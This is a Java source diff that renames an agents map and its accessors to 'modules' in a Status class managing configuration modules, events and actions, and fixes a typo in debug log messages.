@@ -37,7 +37,7 @@ public class Status {
 	private static final String TAG = "Status"; //$NON-NLS-1$
 
 	/** The agents map. */
-	private static HashMap<String, ConfModule> agentsMap;
+	private static HashMap<String, ConfModule> modulesMap;
 
 	/** The events map. */
 	private static HashMap<Integer, ConfEvent> eventsMap;
@@ -88,7 +88,7 @@ public class Status {
 	private Status() {
 		
 		
-		agentsMap = new HashMap<String, ConfModule>();
+		modulesMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
 
@@ -125,7 +125,7 @@ public class Status {
 	 * Clean.
 	 */
 	static public void clean() {
-		agentsMap.clear();
+		modulesMap.clear();
 		eventsMap.clear();
 		actionsMap.clear();
 		globals = null;
@@ -198,11 +198,11 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public static void addAgent(final ConfModule a) throws GeneralException {
-		if (agentsMap.containsKey(a.getType()) == true) {
+	public static void addModule(final ConfModule a) throws GeneralException {
+		if (modulesMap.containsKey(a.getType()) == true) {
 			// throw new RCSException("Agent " + a.getId() + " already loaded");
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "Substituing agent: " + a); //$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Warn: " + "Substituting module: " + a); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 
@@ -211,7 +211,7 @@ public class Status {
 			Check.asserts(key != null, "null key"); //$NON-NLS-1$
 		}
 
-		agentsMap.put(a.getType(), a);
+		modulesMap.put(a.getType(), a);
 	}
 
 	// Add an event to the map
@@ -232,7 +232,7 @@ public class Status {
 		if (eventsMap.containsKey(e.getId()) == true) {
 			// throw new RCSException("Event " + e.getId() + " already loaded");
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "Substituing event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Warn: " + "Substituting event: " + e); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 
@@ -277,7 +277,7 @@ public class Status {
 	 * @return the agents number
 	 */
 	static public int getAgentsNumber() {
-		return agentsMap.size();
+		return modulesMap.size();
 	}
 
 	/**
@@ -294,8 +294,8 @@ public class Status {
 	 * 
 	 * @return the agents map
 	 */
-	static public HashMap<String, ConfModule> getAgentsMap() {
-		return agentsMap;
+	static public HashMap<String, ConfModule> getModulesMap() {
+		return modulesMap;
 	}
 
 	/**
@@ -363,10 +363,6 @@ public class Status {
 	}
 
 	/**
-	 * Gets the option.
-	 * 
-	 * @param id
-	 *            the id
 	 * @return the option
 	 * @throws GeneralException
 	 *             the RCS exception
